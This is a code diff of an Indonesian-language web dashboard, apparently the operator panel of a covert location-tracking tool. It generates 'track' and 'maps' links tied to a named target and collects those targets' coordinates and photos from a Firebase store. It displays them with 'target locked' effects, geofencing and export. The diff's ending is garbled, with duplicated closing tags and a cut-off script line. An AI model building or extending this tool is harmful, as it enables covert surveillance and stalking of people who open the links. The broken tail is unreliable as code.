@@ -207,19 +207,15 @@ body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradi
   <div class="prompt">[Generate] Tracking Link</div>
   <div style="font-size:10px;color:var(--text-d);margin-bottom:8px">› input target name:</div>
   <input id="targetName" class="term-input" placeholder="contoh: Rorax" oninput="typingSound()">
-  <button class="term-btn" onclick="genLink()">[ Generate Link ]</button>
+  <div style="font-size:10px;color:var(--text-d);margin:2px 0 8px">› pilih jenis link:</div>
+  <div style="display:flex;gap:8px">
+    <button class="term-btn" onclick="genLink()" style="margin:0">[ Track Link ]</button>
+    <button class="term-btn outline" onclick="genLinkMaps()" style="margin:0">[ Maps Link ]</button>
+  </div>
   <div id="linkResult" style="display:none;margin-top:12px">
-    <div style="font-size:10px;color:var(--text-d);margin-bottom:6px">› target link:</div>
+    <div style="font-size:10px;color:var(--text-d);margin-bottom:6px" id="linkTypeLabel">› target link:</div>
     <div class="link-url-box" id="linkUrl"></div>
     <button class="term-btn outline" id="btnCopy" onclick="copyLink()" style="margin-top:10px">[ 📋 Salin Link ]</button>
-  </div>
-  <!-- ADDED: GENERATE MAPS LINK -->
-  <div style="font-size:10px;color:var(--text-d);margin:14px 0 8px">› 🗺️ link maps (maps.html):</div>
-  <button class="term-btn outline" onclick="genLinkMaps()">[ 🗺️ Generate Maps Link ]</button>
-  <div id="linkResultMaps" style="display:none;margin-top:12px">
-    <div style="font-size:10px;color:var(--text-d);margin-bottom:6px">› target link (maps):</div>
-    <div class="link-url-box" id="linkUrlMaps"></div>
-    <button class="term-btn outline" id="btnCopyMaps" onclick="copyLinkMaps()" style="margin-top:10px">[ 📋 Salin Link Maps ]</button>
   </div>
 </div>
 
@@ -253,7 +249,7 @@ body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradi
 
 <!-- MAPS LOCATION (ADDED) -->
 <div class="term-body">
-  <div class="prompt">[Data] Maps Location 🗺️</div>
+  <div class="prompt">[Data] Maps Location</div>
   <div class="map-box" id="mapMapsBox">
     <div id="mapMaps" class="map-inner"></div>
     <div class="map-label" id="mapMapsLabel">◈ AWAITING MAPS</div>
@@ -628,13 +624,11 @@ window.bukaMapsApk=()=>{const la=document.getElementById('apkLat').innerText,ln=
 
 // GENERATE LINK
 let currentLink='';
-window.genLink=()=>{playKlik();const t=document.getElementById('targetName').value.trim()||'target';const u=location.origin+'/track.html?u='+encodeURIComponent(user)+'&t='+encodeURIComponent(t);currentLink=u;document.getElementById('linkUrl').innerText=u;document.getElementById('linkResult').style.display='block';addLog('Link: '+t);beep(900,.08)};
+window.genLink=()=>{playKlik();const t=document.getElementById('targetName').value.trim()||'target';const u=location.origin+'/track.html?u='+encodeURIComponent(user)+'&t='+encodeURIComponent(t);currentLink=u;document.getElementById('linkUrl').innerText=u;document.getElementById('linkResult').style.display='block';document.getElementById('linkTypeLabel').innerText='› target link (TRACK):';addLog('Link track: '+t);beep(900,.08)};
 window.copyLink=async()=>{if(!currentLink)return;try{await navigator.clipboard.writeText(currentLink);document.getElementById('btnCopy').innerText='[ ✓ Tersalin ]';setTimeout(()=>document.getElementById('btnCopy').innerText='[ 📋 Salin Link ]',2000)}catch(e){}};
 
-// ── ADDED: GENERATE MAPS LINK ──
-let currentLinkMaps='';
-window.genLinkMaps=()=>{playKlik();const t=document.getElementById('targetName').value.trim()||'target';const u=location.origin+'/maps.html?u='+encodeURIComponent(user)+'&t='+encodeURIComponent(t);currentLinkMaps=u;document.getElementById('linkUrlMaps').innerText=u;document.getElementById('linkResultMaps').style.display='block';addLog('Link maps: '+t);beep(900,.08)};
-window.copyLinkMaps=async()=>{if(!currentLinkMaps)return;try{await navigator.clipboard.writeText(currentLinkMaps);document.getElementById('btnCopyMaps').innerText='[ ✓ Tersalin ]';setTimeout(()=>document.getElementById('btnCopyMaps').innerText='[ 📋 Salin Link Maps ]',2000)}catch(e){}};
+// ── ADDED: GENERATE MAPS LINK (hasil tampil di kotak link bersama) ──
+window.genLinkMaps=()=>{playKlik();const t=document.getElementById('targetName').value.trim()||'target';const u=location.origin+'/maps.html?u='+encodeURIComponent(user)+'&t='+encodeURIComponent(t);currentLink=u;document.getElementById('linkUrl').innerText=u;document.getElementById('linkResult').style.display='block';document.getElementById('linkTypeLabel').innerText='› target link (MAPS):';addLog('Link maps: '+t);beep(900,.08)};
 
 // DATA
 let allData=[],lastCnt=0,firstLoad=true;
@@ -661,7 +655,7 @@ function renderData(){
   document.getElementById('countShown').innerText=filtered.length;
   document.getElementById('countTotal').innerText=allData.filter(([,d])=>d.via!=='maps').length; // ADDED: hitung track saja
   const c=document.getElementById('hasil');
-  if(!filtered.length){c.innerHTML='<div class="empty">No data matches</div>';return}
+  if(!filtered.length){c.innerHTML='<div class="empty">No data matches</div>';updateStats();updateMultiMap();checkGeofence();return} // FIX: stats/multi/geofence tetap update walau kolom track kosong
   c.innerHTML=filtered.map(([key,d])=>`
     <div class="card-data" id="card-${key}">
       <div class="card-top">
@@ -685,7 +679,7 @@ function renderData(){
       <textarea class="card-note" id="note_${key}" placeholder="› catatan...">${getNote(key)}</textarea>
       <div class="card-actions">
         <button onclick="saveNote('${key}')">📝 NOTE</button>
-        <button onclick="zoomMulti(${d.lat},${d.lng})">🗺 MULTI</button>
+        <button onclick="zoomMulti(${d.lat},${d.lng})">MULTI</button>
         <button onclick="downloadCard('${key}')">📥 SAVE</button>
         <button class="del" onclick="deleteItem('${key}')">🗑️ DEL</button>
       </div>
@@ -709,7 +703,7 @@ window.exportJSON=()=>{const _td=allData.filter(([,d])=>d.via!=='maps');if(!_td.
 
 onValue(ref(db,'lokasi/'+user),snap=>{
   const data=snap.val();
-  if(!data){allData=[];document.getElementById('hasil').innerHTML='<div class="empty">Waiting for data...</div>';document.getElementById('countShown').innerText='0';document.getElementById('countTotal').innerText='0';updateStats();return}
+  if(!data){allData=[];document.getElementById('hasil').innerHTML='<div class="empty">Waiting for data...</div>';document.getElementById('countShown').innerText='0';document.getElementById('countTotal').innerText='0';updateStats();updateMultiMap();return}
   allData=Object.entries(data).filter(([,d])=>d.target).sort((a,b)=>b[1].waktu-a[1].waktu);
   if(!firstLoad&&allData.length>lastCnt){linkDataSound();addLog('🎯 DATA BARU!','warn')}
   lastCnt=allData.length;firstLoad=false;renderData();
@@ -775,7 +769,7 @@ function animasiMapMaps(lat,lng,target,foto){
       mapMaps.scrollWheelZoom.enable();
       targetLockedSound();
       hackerVoice();
-      addLog('🗺️ Maps locked: '+target);
+      addLog('🎯 Maps locked: '+target);
       return;
     }
     const s=stages[idx];
@@ -816,7 +810,7 @@ function renderDataMaps(){
       <textarea class="card-note" id="note_${key}" placeholder="› catatan...">${getNote(key)}</textarea>
       <div class="card-actions">
         <button onclick="saveNote('${key}')">📝 NOTE</button>
-        <button onclick="zoomMulti(${d.lat},${d.lng})">🗺 MULTI</button>
+        <button onclick="zoomMulti(${d.lat},${d.lng})">MULTI</button>
         <button onclick="downloadCard('${key}')">📥 SAVE</button>
         <button class="del" onclick="deleteItemMaps('${key}')">🗑️ DEL</button>
       </div>
@@ -834,7 +828,7 @@ window.exportJSONMaps=()=>{if(!allDataMaps.length)return alert('No data');const 
 onValue(ref(db,'lokasi/'+user),snap=>{
   const data=snap.val()||{};
   allDataMaps=Object.entries(data).filter(([,d])=>d&&d.target&&d.via==='maps').sort((a,b)=>(b[1].waktu||0)-(a[1].waktu||0));
-  if(!firstLoadMaps&&allDataMaps.length>lastCntMaps){linkDataSound();addLog('🗺️ DATA BARU MAPS!','warn')}
+  if(!firstLoadMaps&&allDataMaps.length>lastCntMaps){linkDataSound();addLog('🎯 DATA BARU MAPS!','warn')}
   lastCntMaps=allDataMaps.length;firstLoadMaps=false;renderDataMaps();
 });
 addLog('Maps module ready');
@@ -858,5 +852,11 @@ if(lawan){setTitle();loadChat()}
 addLog('System ready v2');
 </script>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+</body>
+</html>
+pt>
+</body>
+</html>
+//cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
 </body>
 </html>
